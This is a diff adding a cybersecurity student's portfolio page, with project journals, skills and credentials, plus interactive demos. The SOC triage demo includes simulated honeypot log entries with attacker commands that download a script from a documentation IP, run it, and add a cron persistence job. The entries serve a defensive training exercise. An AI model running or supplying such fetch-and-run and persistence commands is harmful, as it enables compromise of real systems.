+        <span class="pill done">2024</span>
+      </div>
+      <div class="three">
+        <div><h4>Problem</h4><p>Checking a suspicious file meant juggling several tools by hand. I wanted one pipeline that gives a clear verdict.</p></div>
+        <div><h4>Built</h4><p>Python pipeline on EC2: SHA-256 hashing, ClamAV signature scan, VirusTotal hash lookup, auto-generated report.</p></div>
+        <div><h4>Skills shown</h4><p>Python scripting, REST APIs, cloud hosting, malware triage, signature vs. reputation detection.</p></div>
+      </div>
+      <div class="tabs" role="tablist"><button role="tab" data-t="try">Try it: scan a file</button><button role="tab" data-t="journal">Journal<span class="count"></span></button></div>
+      <div role="tabpanel" data-p="try">
+        <div class="demo">
+          <div class="demo-bar"><b>Scanner pipeline</b><span class="sample">sample files · your file stays in your browser</span></div>
+          <div class="howto"><b>Pick a sample</b> or <b>hash your own file</b>, then run the scan. The SHA-256 is computed for real in your browser. Your file is never uploaded anywhere.</div>
+          <div class="samples" id="scSamples"></div>
+          <div class="pipe" id="scPipe">
+            <div class="step"><b>01 · Intake</b>File received</div>
+            <div class="step"><b>02 · Hash</b>SHA-256</div>
+            <div class="step"><b>03 · ClamAV</b>Signature scan</div>
+            <div class="step"><b>04 · VirusTotal</b>Hash reputation</div>
+            <div class="step"><b>05 · Report</b>Verdict + IOCs</div>
+          </div>
+          <div style="padding:0 14px 14px"><button class="btn primary" id="scRun">Run scan</button></div>
+          <div class="scan-grid">
+            <div><pre class="code" id="scOut">$ python scanner.py
+Pick a file and press "Run scan".</pre></div>
+            <div id="scReport"><p class="muted" style="font-size:.88rem">The verdict and report appear here after the scan.</p></div>
+          </div>
+        </div>
+      </div>
+      <div role="tabpanel" data-p="journal" hidden><div class="journal" data-journal="scan"></div></div>
+    </article>
+
+    <!-- 4. FORENSICS -->
+    <article class="proj" id="p-dfir" data-proj="dfir">
+      <div class="proj-top">
+        <div><span class="eyebrow">Computer Security &amp; Forensics · Capstone II</span><h3>Windows Artifact Investigation</h3>
+          <p>I reconstructed user activity from Windows artifacts using Eric Zimmerman's JumpList Explorer and ShellBags Explorer, and analyzed disk images in Autopsy. This case shows how separate artifacts combine into one story.</p></div>
+        <span class="pill done">2026</span>
+      </div>
+      <div class="tabs" role="tablist"><button role="tab" data-t="try">Try it: solve the case</button><button role="tab" data-t="journal">Journal<span class="count"></span></button></div>
+      <div role="tabpanel" data-p="try">
+        <div class="demo">
+          <div class="demo-bar"><b>Case 2026-031 · departing employee, suspected data theft</b><span class="sample">sample case</span></div>
+          <div class="howto"><b>Answer each question</b> by clicking the timeline row that proves it. Filter by artifact or search to narrow it down.</div>
+          <div class="case">
+            <div class="case-left">
+              <div class="tl-tools"><div class="chips" id="tlFilters"></div><input id="tlSearch" type="search" placeholder="Search events" aria-label="Search timeline"></div>
+              <div class="tl-wrap"><table class="tl"><thead><tr><th>Time (UTC)</th><th>Artifact</th><th>Event</th></tr></thead><tbody id="tlBody"></tbody></table></div>
+            </div>
+            <div class="qs" id="tlQs" aria-live="polite"></div>
+          </div>
+        </div>
+      </div>
+      <div role="tabpanel" data-p="journal" hidden><div class="journal" data-journal="dfir"></div></div>
+    </article>
+
+    <!-- 5. SEED -->
+    <article class="proj" id="p-seed" data-proj="seed">
+      <div class="proj-top">
+        <div><span class="eyebrow">Cybersecurity Capstone II · Fall 2026</span><h3>Attack &amp; Cryptography Labs (SEED Labs)</h3>
+          <p>Hands-on attack labs in an isolated Ubuntu VM. Learning how each attack works helps me recognize it from the defender's side. Our team project rebuilds the Morris Worm across Docker containers, and each week we present an analysis of a recent real-world breach.</p></div>
+        <span class="pill on">In progress</span>
+      </div>
+      <div class="tabs" role="tablist"><button role="tab" data-t="try">Explore the labs</button><button role="tab" data-t="journal">Journal<span class="count"></span></button></div>
+      <div role="tabpanel" data-p="try">
+        <div class="demo">
+          <div class="demo-bar"><b>Lab sequence · tap a lab to open it</b><div class="chips" id="seedFilter"></div></div>
+          <div class="labgrid" id="seedGrid"></div>
+        </div>
+      </div>
+      <div role="tabpanel" data-p="journal" hidden><div class="journal" data-journal="seed"></div></div>
+    </article>
+  </div>
+</section>
+
+<section id="process">
+  <div class="wrap">
+    <div class="sec-head"><span class="eyebrow">How I work an alert</span><h2>My triage process</h2><p>The steps I follow on any alert, whether it comes from Splunk at work or from my honeypot at home.</p></div>
+    <ol class="process">
+      <li><b>Validate</b><span>Confirm the alert is real and not a known false positive. Check the rule logic and the raw event.</span></li>
+      <li><b>Scope</b><span>Pivot on user, host, IP, and hash in the SIEM to find every related event.</span></li>
+      <li><b>Enrich</b><span>Check reputation (VirusTotal, AbuseIPDB) and map the behavior to MITRE ATT&amp;CK.</span></li>
+      <li><b>Contain or escalate</b><span>Follow the playbook: block, isolate, or hand off to Tier 2 with clear notes.</span></li>
+      <li><b>Document</b><span>Write the ticket so the next analyst understands what happened in two minutes.</span></li>
+    </ol>
+  </div>
+</section>
+
+<section id="skills">
+  <div class="wrap">
+    <div class="sec-head"><span class="eyebrow">Skills</span><h2>What I can do, and where you can see it</h2></div>
+    <div class="skills">
+      <div class="skill"><h3>Security operations</h3><div class="tags" style="margin-top:0"><span class="tag">Splunk SIEM</span><span class="tag">Alert triage</span><span class="tag">Log analysis</span><span class="tag">Phishing analysis</span><span class="tag">Incident response</span><span class="tag">MITRE ATT&amp;CK</span></div><p class="proof">See it in: <a href="#p-lab">Honeypot lab</a> · <a href="#p-phish">Phishing trainer</a> · NYC DSS internship</p></div>
+      <div class="skill"><h3>Network security &amp; monitoring</h3><div class="tags" style="margin-top:0"><span class="tag">TCP/IP</span><span class="tag">DNS</span><span class="tag">IPsec</span><span class="tag">Firewalls</span><span class="tag">IDS/IPS</span><span class="tag">Wireshark</span><span class="tag">tcpdump</span><span class="tag">ntopng</span></div><p class="proof">See it in: <a href="#p-lab">Honeypot lab</a> · Network Security &amp; Forensics course</p></div>
+      <div class="skill"><h3>Digital forensics</h3><div class="tags" style="margin-top:0"><span class="tag">Autopsy</span><span class="tag">JumpList Explorer</span><span class="tag">ShellBags Explorer</span><span class="tag">Windows artifacts</span><span class="tag">Timeline analysis</span></div><p class="proof">See it in: <a href="#p-dfir">Windows artifact case</a></p></div>
+      <div class="skill"><h3>GRC &amp; frameworks</h3><div class="tags" style="margin-top:0"><span class="tag">NIST CSF</span><span class="tag">NIST SP 800-53</span><span class="tag">Risk assessment</span><span class="tag">Control testing</span><span class="tag">Compliance reporting</span></div><p class="proof">See it in: NYC DSS internship</p></div>
+      <div class="skill"><h3>Systems &amp; cloud</h3><div class="tags" style="margin-top:0"><span class="tag">Linux (Ubuntu)</span><span class="tag">Windows 10/11/Server</span><span class="tag">AWS EC2</span><span class="tag">Azure</span><span class="tag">Docker</span><span class="tag">VMware</span><span class="tag">VirtualBox</span></div><p class="proof">See it in: <a href="#p-scan">Malware scanner</a> · <a href="#p-seed">SEED labs</a></p></div>
+      <div class="skill"><h3>Scripting &amp; tools</h3><div class="tags" style="margin-top:0"><span class="tag">Python</span><span class="tag">PowerShell</span><span class="tag">Bash</span><span class="tag">SQL</span><span class="tag">Git</span><span class="tag">Azure DevOps</span></div><p class="proof">See it in: <a href="#p-scan">Malware scanner</a></p></div>
+    </div>
+  </div>
+</section>
+
+<section id="certs">
+  <div class="wrap">
+    <div class="sec-head"><span class="eyebrow">Certifications &amp; education</span><h2>Credentials</h2></div>
+    <div class="certs">
+      <div class="cert"><div><b>Google Cybersecurity Professional Certificate</b><span>Google · Coursera</span></div><span class="pill done">Earned</span></div>
+      <div class="cert"><div><b>Introduction to Cybersecurity</b><span>Cisco Networking Academy · completed Sep 6, 2026 · Cert ID <span class="mono">be4bd88a-2d44-436c-8b9d-b0e803d241d9</span></span></div><span class="pill done">Earned</span></div>
+      <div class="cert"><div><b>CompTIA Security+</b><span>CompTIA</span></div><span class="pill prog">In progress</span></div>
+      <div class="cert"><div><b>Ethical Hacker</b><span>Cisco Networking Academy</span></div><span class="pill prog">In progress</span></div>
+      <div class="cert"><div><b>SOC Level 1 learning path</b><span>TryHackMe</span></div><span class="pill prog">In progress</span></div>
+    </div>
+    <div class="edu">
+      <div><span class="when">Expected Dec 2026</span><h3 style="margin-top:6px">B.S. Computer Science &amp; Information Security</h3><p>CUNY John Jay College of Criminal Justice. Coursework: Network Security &amp; Forensics, Computer Security &amp; Forensics, Cryptography &amp; Cryptanalysis, Linux System Administration &amp; Security, Computer Networking, Operating Systems, Cybersecurity Capstone I &amp; II.</p></div>
+      <div><span class="when">Jul 2024</span><h3 style="margin-top:6px">A.S. Computer Science</h3><p>CUNY LaGuardia Community College · Dean's List</p></div>
+    </div>
+  </div>
+</section>
+
+<section id="contact">
+  <div class="wrap">
+    <div class="contact">
+      <div><span class="eyebrow">Contact</span><h2 style="margin-top:8px">Hiring for a SOC team in New York?</h2>
+        <p>I'm available for full-time roles after I graduate in December 2026, and I'm happy to talk sooner. Email is the fastest way to reach me.</p></div>
+      <div class="rows">
+        <div class="crow"><span>khadkaroman200@gmail.com</span><button type="button" class="copy" data-copy="khadkaroman200@gmail.com">Copy</button></div>
+        <div class="crow"><span>yogendra.khadka63@login.cuny.edu</span><button type="button" class="copy" data-copy="yogendra.khadka63@login.cuny.edu">Copy</button></div>
+        <div class="crow"><span><a href="https://www.linkedin.com/in/roman-khadka1/" target="_blank" rel="noopener">linkedin.com/in/roman-khadka1</a></span></div>
+        <div class="crow"><span><a href="https://github.com/Romankdk" target="_blank" rel="noopener">github.com/Romankdk</a></span></div>
+        <div class="crow"><span><a href="Yogendra_Khadka_Resume.pdf" target="_blank" rel="noopener">Resume (PDF)</a></span></div>
       </div>
     </div>
-  </section>
+  </div>
+</section>
+</main>
+<footer><div class="wrap"><span>© 2026 Yogendra (Roman) Khadka · New York, NY</span><span>Demo data uses reserved documentation IP ranges (RFC 5737) and fictional organizations.</span></div></footer>
 
-</div>
+<script>
+/* =====================================================================
+   PROJECT JOURNALS. Edit these entries so every one matches what
+   actually happened to you. Recruiters will ask about them.
+   kind: build | problem | fix | lesson
+   ===================================================================== */
+const JOURNALS = {
+  lab: [
+    {when:'Phase 1 · Setup', kind:'build', title:'Flashed the Pi and hardened the base OS', text:'Installed Raspberry Pi OS Lite, created a non-root user, disabled password SSH login for my own access, and turned on automatic security updates before exposing anything.'},
+    {when:'Phase 1 · Setup', kind:'problem', title:'Cowrie and my real SSH both wanted port 22', text:'Attackers scan port 22, but my own admin SSH was already listening there, and Cowrie runs on port <code>2222</code> by default.'},
+    {when:'Phase 1 · Setup', kind:'fix', title:'Moved admin SSH and redirected port 22 to Cowrie', text:'Moved my real SSH to a high port allowed only from my laptop, then added an iptables rule to redirect inbound 22 to 2222. Bots now land in the honeypot and never reach the real service.'},
+    {when:'Phase 2 · Isolation', kind:'lesson', title:'A honeypot is a risk if it can reach your network', text:'If an attacker escaped Cowrie, the Pi would sit next to my personal devices. I isolated it on its own network segment and blocked it from starting connections to my home LAN. Containment comes before data collection.'},
+    {when:'Phase 3 · Monitoring', kind:'problem', title:'ntopng and Grafana fought over port 3000', text:'Both tools default to port 3000, so whichever started second failed silently and the dashboard showed nothing.'},
+    {when:'Phase 3 · Monitoring', kind:'fix', title:'Reassigned ports and checked with ss', text:'Ran <code>sudo ss -tulpn</code> to see what owned each port, moved ntopng to 3001 in its config, and documented every service port in a README.'},
+    {when:'Phase 3 · Monitoring', kind:'lesson', title:'Logs fill an SD card fast', text:'Brute-force traffic generates thousands of Cowrie JSON lines a day. I set up log rotation so the SD card wouldn\'t fill up and crash the Pi.'},
+    {when:'Next', kind:'build', title:'Ship Cowrie logs into Grafana and map to ATT&CK', text:'Working on feeding Cowrie\'s JSON logs into a Grafana panel that shows top attacking IPs, most-tried passwords, and commands mapped to MITRE ATT&CK techniques.'}
+  ],
+  phish: [
+    {when:'Internship · NYC DSS', kind:'lesson', title:'Check authentication results first', text:'SPF, DKIM, and DMARC results in the headers answer "did this domain really send it?" in seconds, before I spend time on the body.'},
+    {when:'Internship · NYC DSS', kind:'problem', title:'Real vendor emails can fail SPF', text:'Some legitimate messages come from third-party senders the domain owner never added to its SPF record, so they fail SPF and look suspicious.'},
+    {when:'Internship · NYC DSS', kind:'fix', title:'Judge on several signals, not one', text:'I learned to weigh sender history, link destinations, and the request being made, not a single failed check. That cut down false positives.'},
+    {when:'Internship · NYC DSS', kind:'build', title:'Turned analysis into training', text:'Built incident response training modules from the patterns I saw, so staff could recognize phishing before reporting it.'},
+    {when:'Lesson', kind:'lesson', title:'Passing authentication does not mean safe', text:'Business email compromise often comes from a real free-mail account that passes every check. The red flag is the request itself: gift cards, wire changes, secrecy.'}
+  ],
+  scan: [
+    {when:'Week 1', kind:'build', title:'Launched an EC2 instance and locked it down', text:'Started a small Ubuntu EC2 instance and restricted the security group so only my IP could reach SSH and the upload endpoint.'},
+    {when:'Week 1', kind:'problem', title:'ClamAV was too heavy for a small instance', text:'The ClamAV daemon loads its entire signature database into memory, and the small instance kept running out of RAM.'},
+    {when:'Week 1', kind:'fix', title:'Added swap and used on-demand scanning', text:'Added a swap file and ran <code>clamscan</code> per file instead of keeping the daemon loaded. Slower per scan, but stable on a small budget.'},
+    {when:'Week 2', kind:'problem', title:'Hit VirusTotal\'s free API rate limit', text:'The free public API allows only a few requests per minute, so batch scans failed partway through.'},
+    {when:'Week 2', kind:'fix', title:'Cached results by hash and added a queue', text:'Stored every lookup result keyed by SHA-256, so repeat files never call the API again, and paced new lookups to stay under the limit.'},
+    {when:'Lesson', kind:'lesson', title:'Look up hashes, don\'t upload files', text:'Uploading a file to VirusTotal shares it with every subscriber. For sensitive files, a hash lookup gives the reputation without leaking the content.'}
+  ],
+  dfir: [
+    {when:'Lab', kind:'build', title:'Parsed Jump Lists and ShellBags from a Windows image', text:'Used JumpList Explorer to see which files each application opened, and ShellBags Explorer to see which folders the user browsed, including on removable drives.'},
+    {when:'Lab', kind:'problem', title:'ShellBags looked incomplete at first', text:'Folder history was missing entries because ShellBags are split across two registry hives: <code>NTUSER.DAT</code> and <code>UsrClass.dat</code>.'},
+    {when:'Lab', kind:'fix', title:'Loaded both hives', text:'Exported and loaded both hives, and the missing folders, including removable drive paths, showed up.'},
+    {when:'Lab', kind:'problem', title:'Timestamps didn\'t line up across tools', text:'Some tools showed local time and others UTC, which made events look out of order.'},
+    {when:'Lab', kind:'fix', title:'Normalized everything to UTC', text:'Set every tool to UTC before building the timeline. Now events from different artifacts line up correctly.'},
+    {when:'Lesson', kind:'lesson', title:'One artifact is a clue, several are evidence', text:'A Jump List alone shows a file was opened. Combined with USB registry entries and ShellBags, it shows where the file came from and what happened next.'}
+  ],
+  seed: [
+    {when:'Week 1', kind:'build', title:'Completed the Environment Variable & Set-UID lab', text:'Showed how a privileged Set-UID program can be tricked through PATH and LD_PRELOAD into running attacker-controlled code.'},
+    {when:'Week 1', kind:'problem', title:'The privilege escalation didn\'t work at first', text:'Ubuntu\'s <code>/bin/sh</code> points to dash, which drops Set-UID privileges as a built-in protection.'},
+    {when:'Week 1', kind:'fix', title:'Swapped the shell inside the sandbox only', text:'Linked <code>/bin/sh</code> to zsh inside the lab VM, as the lab directs, to see the vulnerable behavior. That showed exactly why the protection exists.'},
+    {when:'Setup', kind:'problem', title:'Running a VM plus Docker on an i3 laptop', text:'The SEED Ubuntu VM in VMware, plus the Docker containers for the Morris Worm project, pushes a Lenovo IdeaPad 3 hard.'},
+    {when:'Setup', kind:'fix', title:'Tuned the VM and kept attacks in the sandbox', text:'Gave the VM a fixed share of RAM and CPU, closed host apps during labs, and ran every attack only inside the VM, never on the host or school network.'},
+    {when:'Lesson', kind:'lesson', title:'Every attack lab ends with a detection question', text:'For each lab I write down what the attack would look like in logs or traffic, so the offensive work turns into defensive knowledge.'}
+  ]
+};
 
-<footer>
-  <p>Built by <span>Yogendra Khadka</span></p>
-  <p>yogendra.khadka@jjay.cuny.edu · New York, NY</p>
-</footer>
+(function(){
+  const $ = (s,r=document)=>r.querySelector(s), $$=(s,r=document)=>[...r.querySelectorAll(s)];
+  const esc = s => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+  const reduce = matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+  /* ---------- Tabs ---------- */
+  $$('.proj').forEach(p=>{
+    const tabs=$$('[role=tab]',p), panels=$$('[role=tabpanel]',p);
+    const sel=t=>{tabs.forEach(b=>{const on=b.dataset.t===t;b.setAttribute('aria-selected',on);b.tabIndex=on?0:-1;});panels.forEach(x=>x.hidden=x.dataset.p!==t);};
+    tabs.forEach((b,i)=>{b.addEventListener('click',()=>sel(b.dataset.t));
+      b.addEventListener('keydown',e=>{if(e.key==='ArrowRight'||e.key==='ArrowLeft'){const n=tabs[(i+(e.key==='ArrowRight'?1:-1)+tabs.length)%tabs.length];n.focus();sel(n.dataset.t);}});});
+    sel(tabs[0].dataset.t);
+    const j=JOURNALS[p.dataset.proj]; const c=$('.count',p); if(j&&c) c.textContent=j.length;
+  });
+
+  /* ---------- Journals ---------- */
+  const KIND={build:['Build','info'],problem:['Problem','high'],fix:['Fix','low'],lesson:['Lesson','med']};
+  $$('[data-journal]').forEach(box=>{
+    const entries=JOURNALS[box.dataset.journal]; let f='all';
+    const render=()=>{
+      const list=entries.filter(e=>f==='all'||(f==='pf'?(e.kind==='problem'||e.kind==='fix'):e.kind===f));
+      box.innerHTML=`<div class="j-tools"><div class="chips">${[['all','All entries'],['pf','Problems & fixes'],['lesson','Lessons'],['build','Builds']].map(([k,l])=>`<button class="chip" data-f="${k}" aria-pressed="${f===k}">${l}</button>`).join('')}</div><span class="mono muted" style="font-size:.74rem">${entries.filter(e=>e.kind==='problem').length} problems solved</span></div>
+      <ol class="j-list">${list.map(e=>`<li class="j-item" data-k="${e.kind}"><div class="j-head"><span class="sev ${KIND[e.kind][1]}">${KIND[e.kind][0]}</span><span class="when">${esc(e.when)}</span></div><b>${esc(e.title)}</b><p>${e.text}</p></li>`).join('')}</ol>`;
+    };
+    box.addEventListener('click',e=>{const b=e.target.closest('.chip');if(b){f=b.dataset.f;render();}});
+    render();
+  });
+
+  /* ---------- Terminal ---------- */
+  const out=$('#termOut'), inp=$('#termIn');
+  const C={
+    help:()=>'Commands:\n  <span class="p">whoami</span>     who I am\n  <span class="p">skills</span>     what I work with\n  <span class="p">projects</span>   jump to a project lab\n  <span class="p">certs</span>      certifications\n  <span class="p">experience</span> work history\n  <span class="p">contact</span>    how to reach me\n  <span class="p">resume</span>     open my resume\n  <span class="p">clear</span>      clear the screen',
+    whoami:()=>'Yogendra "Roman" Khadka\nEntry-level SOC Analyst · New York City\nB.S. Computer Science & Information Security, John Jay College (Dec 2026)\nI like turning noisy logs into a clear story of what happened.',
+    skills:()=>'[soc]       Splunk SIEM, alert triage, phishing analysis, incident response, MITRE ATT&CK\n[network]   TCP/IP, DNS, IDS/IPS, Wireshark, tcpdump, ntopng\n[forensics] Autopsy, JumpList Explorer, ShellBags Explorer\n[grc]       NIST CSF, NIST SP 800-53\n[systems]   Linux, Windows Server, AWS EC2, Azure, Docker\n[scripting] Python, PowerShell, Bash, SQL',
+    projects:()=>'1  <a href="#p-lab">SOC & Honeypot Lab</a>         triage a live-style alert queue\n2  <a href="#p-phish">Phishing Analysis Trainer</a>  analyze 3 reported emails\n3  <a href="#p-scan">Cloud Malware Scanner</a>      hash and scan a file\n4  <a href="#p-dfir">Windows Artifact Case</a>      solve a data-theft case\n5  <a href="#p-seed">SEED Attack Labs</a>           attack labs, defender notes',
+    certs:()=>'[✓] Google Cybersecurity Professional Certificate\n[✓] Cisco Networking Academy: Introduction to Cybersecurity (Sep 2026)\n[~] CompTIA Security+ (in progress)\n[~] Cisco Ethical Hacker (in progress)\n[~] TryHackMe SOC Level 1 (in progress)',
+    experience:()=>'2025  Cybersecurity Analyst Intern · NYC Department of Social Services\n      Splunk triage across 15,000+ employees · NIST CSF / 800-53 assessments\n2022  Student IT Technician · Norwich University ITS\n      30% fewer security incidents across 500+ endpoints',
+    contact:()=>'email    khadkaroman200@gmail.com\nschool   yogendra.khadka63@login.cuny.edu\nlinkedin <a href="https://www.linkedin.com/in/roman-khadka1/" target="_blank" rel="noopener">linkedin.com/in/roman-khadka1</a>\ngithub    <a href="https://github.com/Romankdk" target="_blank" rel="noopener">github.com/Romankdk</a>',
+    resume:()=>'Opening resume: <a href="Yogendra_Khadka_Resume.pdf" target="_blank" rel="noopener">Yogendra_Khadka_Resume.pdf</a>',
+    'sudo hire roman':()=>'<span class="p">[sudo] password for recruiter: ********</span>\nAccess granted. Next step: email khadkaroman200@gmail.com',
+    ls:()=>'honeypot_lab/  phishing_trainer/  malware_scanner/  forensics_case/  seed_labs/  resume.pdf',
+    'cat /etc/motd':()=>'Authorized recruiters only. All hiring activity is logged. ;)'
+  };
+  function print(html){out.insertAdjacentHTML('beforeend',html+'\n');out.scrollTop=out.scrollHeight;}
+  function run(cmd){
+    cmd=cmd.trim(); if(!cmd) return;
+    print(`<span class="p">roman@soc-lab:~$</span> ${esc(cmd)}`);
+    const k=cmd.toLowerCase().replace(/\s+/g,' ');
+    if(k==='clear'){out.innerHTML='';return;}
+    if(C[k]) print(C[k]()); else print(`<span class="d">command not found: ${esc(cmd)}. Type "help".</span>`);
+  }
+  print('<span class="d">Welcome to Roman\'s SOC lab. Type "help" or tap a command below.</span>');
+  run('whoami');
+  $('#termForm').addEventListener('submit',e=>{e.preventDefault();run(inp.value);inp.value='';});
+  $('#termChips').innerHTML=['help','skills','projects','certs','experience','contact','sudo hire roman','clear'].map(c=>`<button type="button">${c}</button>`).join('');
+  $('#termChips').addEventListener('click',e=>{const b=e.target.closest('button');if(b)run(b.textContent);});
+
+  /* ---------- SOC console ---------- */
+  const TACTICS=[['ca','Credential Access'],['ia','Initial Access'],['di','Discovery'],['c2','Command & Control'],['ex','Execution'],['pe','Persistence']];
+  const EV=[
+    {t:'03:12:07',sev:'high',type:'cowrie.login.failed',sum:'214 failed root logins in 6 min from 203.0.113.45',raw:{eventid:'cowrie.login.failed',src_ip:'203.0.113.45',username:'root',password:'123456',count_6min:214},tp:true,tac:'ca',mitre:'T1110.001 Brute Force: Password Guessing',read:'Automated SSH brute force from a common password list. Typical internet bot behavior.',ioc:['203.0.113.45']},
+    {t:'03:18:44',sev:'high',type:'cowrie.login.success',sum:'root:admin accepted for 198.51.100.23',raw:{eventid:'cowrie.login.success',src_ip:'198.51.100.23',username:'root',password:'admin',session:'c7d210'},tp:true,tac:'ia',mitre:'T1078 Valid Accounts',read:'The honeypot accepts weak credentials on purpose. This session shows what the attacker does after getting in.',ioc:['198.51.100.23','root:admin']},
+    {t:'03:18:51',sev:'med',type:'cowrie.command.input',sum:'uname -a; cat /proc/cpuinfo; nproc',raw:{eventid:'cowrie.command.input',session:'c7d210',input:'uname -a; cat /proc/cpuinfo; nproc'},tp:true,tac:'di',mitre:'T1082 System Information Discovery',read:'Checking CPU and architecture. This often comes right before a cryptominer install.',ioc:[]},
+    {t:'03:19:05',sev:'high',type:'cowrie.command.input',sum:'wget payload from attacker server to /tmp',raw:{eventid:'cowrie.command.input',session:'c7d210',input:'cd /tmp; wget http://198.51.100.23/x.sh -O x.sh'},tp:true,tac:'c2',mitre:'T1105 Ingress Tool Transfer',read:'Downloading a tool from the attacker\'s own server.',ioc:['hxxp://198.51.100.23/x.sh']},
+    {t:'03:19:06',sev:'high',type:'cowrie.command.input',sum:'chmod +x x.sh; ./x.sh',raw:{eventid:'cowrie.command.input',session:'c7d210',input:'chmod +x x.sh; ./x.sh',shasum:'9f2c…e41a (sample)'},tp:true,tac:'ex',mitre:'T1059.004 Unix Shell',read:'Running the downloaded script. Cowrie captured a copy, so the hash can go to the malware scanner.',ioc:['sha256:9f2c…e41a']},
+    {t:'03:19:22',sev:'high',type:'cowrie.command.input',sum:'cron entry added to rerun x.sh every 5 min',raw:{eventid:'cowrie.command.input',session:'c7d210',input:'(crontab -l; echo "*/5 * * * * /tmp/x.sh") | crontab -'},tp:true,tac:'pe',mitre:'T1053.003 Scheduled Task/Job: Cron',read:'Persistence: the script reruns every 5 minutes and survives reboots.',ioc:['cron: */5 /tmp/x.sh']},
+    {t:'09:30:00',sev:'low',type:'ntopng.alert.scan',sum:'Port scan from 192.168.1.20 against the Pi',raw:{alert:'tcp_syn_scan',src_ip:'192.168.1.20',dst_ip:'192.168.1.50',ports:'1-1024',note:'host = analyst laptop'},tp:false,tac:null,mitre:'T1046 Network Service Discovery (authorized)',read:'The source is my own laptop running a scheduled Nmap check of the lab. Authorized testing, so this is benign.',ioc:[]}
+  ];
+  let state=EV.map(()=>null), cur=0, qf='all';
+  const qList=$('#qList'),qDet=$('#qDetail');
+  const label={high:'High',med:'Med',low:'Low'};
+  function renderQ(){
+    $('#qFilter').innerHTML=[['all','All'],['high','High'],['med','Med'],['low','Low'],['open','Untriaged']].map(([k,l])=>`<button class="chip" data-k="${k}" aria-pressed="${qf===k}">${l}</button>`).join('');
+    qList.innerHTML=EV.map((e,i)=>{
+      if(qf==='open'&&state[i]!==null) return ''; if(['high','med','low'].includes(qf)&&e.sev!==qf) return '';
+      const s=state[i]; const st=s===null?'<span class="q-state">new</span>':s?'<span class="q-state tp">TP</span>':'<span class="q-state fp">benign</span>';
+      return `<li><button role="option" data-i="${i}" aria-selected="${i===cur}"><span class="q-time">${e.t}</span><span class="q-type">${esc(e.type)}</span>${st}<span class="q-sum"><span class="sev ${e.sev}" style="margin-right:6px">${label[e.sev]}</span>${esc(e.sum)}</span></button></li>`;}).join('')||'<li class="muted" style="padding:14px;font-size:.86rem">Nothing left in this filter.</li>';
+    const done=state.filter(x=>x!==null).length;
+    $('#qProg').textContent=`${done}/${EV.length} triaged`; $('#qBar').style.width=(done/EV.length*100)+'%';
+    $('#qReport').disabled=done<EV.length;
+    $('#attack').innerHTML=TACTICS.map(([k,n])=>{const lit=EV.some((e,i)=>state[i]===true&&e.tp&&e.tac===k);return `<div class="tac ${lit?'lit':''}"><b>${lit?'Observed':'—'}</b>${n}</div>`;}).join('');
+    const iocs=[...new Set(EV.flatMap((e,i)=>state[i]===true?e.ioc:[]))];
+    $('#iocList').innerHTML=iocs.length?iocs.map(x=>`<span>${esc(x)}</span>`).join(''):'<span class="muted" style="border:0;background:none">None yet. Mark true positives to extract indicators.</span>';
+    renderD();
+  }
+  function renderD(){
+    const e=EV[cur], s=state[cur];
+    let fb='';
+    if(s!==null){const right=s===e.tp; fb=`<div class="feedback ${right?'good':'bad'}"><b>${right?'Correct call.':'Take another look.'}</b>${esc(e.read)}</div>`;}
+    qDet.innerHTML=`<div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap"><span class="sev ${e.sev}">${label[e.sev]}</span><b class="mono" style="font-size:.85rem">${esc(e.type)}</b><span class="mono muted" style="font-size:.74rem">${e.t} UTC</span></div>
+      <pre class="code">${esc(JSON.stringify(e.raw,null,2))}</pre>
+      <div class="kv"><span>ATT&amp;CK</span><span>${s!==null?esc(e.mitre):'<span class="muted">Revealed after you triage</span>'}</span></div>
+      <div class="actions"><button class="btn sm" data-v="1">Mark true positive</button><button class="btn sm" data-v="0">Mark benign</button>${cur<EV.length-1?'<button class="btn sm" data-next>Next alert →</button>':''}</div>${fb}`;
+  }
+  qList.addEventListener('click',e=>{const b=e.target.closest('button');if(b){cur=+b.dataset.i;renderQ();}});
+  $('#qFilter').addEventListener('click',e=>{const b=e.target.closest('.chip');if(b){qf=b.dataset.k;renderQ();}});
+  qDet.addEventListener('click',e=>{const b=e.target.closest('button');if(!b)return;
+    if(b.hasAttribute('data-next')){cur=Math.min(cur+1,EV.length-1);renderQ();return;}
+    if(b.dataset.v!==undefined){state[cur]=b.dataset.v==='1';renderQ();}});
+  $('#qReset').addEventListener('click',()=>{state=EV.map(()=>null);cur=0;qf='all';$('#qReportBox').hidden=true;renderQ();});
+  $('#qReport').addEventListener('click',()=>{
+    const right=EV.filter((e,i)=>state[i]===e.tp).length;
+    const iocs=[...new Set(EV.flatMap(e=>e.tp?e.ioc:[]))];
+    const box=$('#qReportBox'); box.hidden=false;
+    box.innerHTML=`<div style="display:flex;justify-content:space-between;gap:10px;flex-wrap:wrap;align-items:baseline"><h4 style="font-size:1.1rem">Incident report: SSH compromise attempt on honeypot</h4><span class="mono">Your accuracy: ${right}/${EV.length}</span></div>
+      <div class="kv" style="margin-top:10px"><span>Summary</span><span>A bot brute-forced SSH from 203.0.113.45. A second IP, 198.51.100.23, logged in with root:admin, profiled the CPU, downloaded and ran x.sh from its own server, and added a cron job for persistence. The pattern matches a cryptomining botnet.</span>
+      <span>Kill chain</span><span>Credential Access → Initial Access → Discovery → Command &amp; Control → Execution → Persistence</span>
+      <span>IOCs</span><span class="mono" style="font-size:.78rem">${iocs.map(esc).join(' · ')}</span>
+      <span>Benign</span><span>192.168.1.20 port scan: authorized Nmap check from the analyst laptop.</span>
+      <span>Actions</span><span>Block both external IPs, add the hash and URL to the watchlist, and on any real host: remove the cron entry, isolate the machine, rotate credentials, and disable password SSH login.</span></div>`;
+    box.scrollIntoView({behavior:reduce?'auto':'smooth',block:'nearest'});
+  });
+  renderQ();
+
+  /* ---------- Phishing trainer ---------- */
+  const P=(text,flag,note,title)=>({text,flag,note,title});
+  const EMAILS=[
+    {name:'Mailbox storage full', answer:'phish',
+     hdr:[['From',P('IT Service Desk <helpdesk@micros0ft-support.co>',true,'"micros0ft" uses a zero in place of the letter o. This look-alike domain is not Microsoft.','Look-alike sender domain')],
+          ['Reply-To',P('recovery.team@mail-securebox.net',true,'Replies go to an unrelated domain, so the attacker collects the responses.','Reply-To mismatch')],
+          ['To',P('you@northwind-health.org',false,'Your correct address. Nothing unusual here.','Recipient')],
